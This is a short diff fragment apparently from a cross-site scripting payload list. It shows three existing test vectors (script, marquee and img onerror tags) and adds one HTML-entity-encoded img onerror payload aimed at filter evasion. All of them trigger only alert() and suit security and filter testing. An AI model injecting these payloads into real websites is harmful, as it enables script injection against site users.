@@ -5,3 +5,4 @@
 %00"><script>alert(9)</script>
 <marquee loop=1 width=0 onfinish=alert`1`>XSS</marquee>
 <img src=x onerror=alert(1)>
+&quot;&gt;&lt;img src=x onerror=alert(1);&gt;
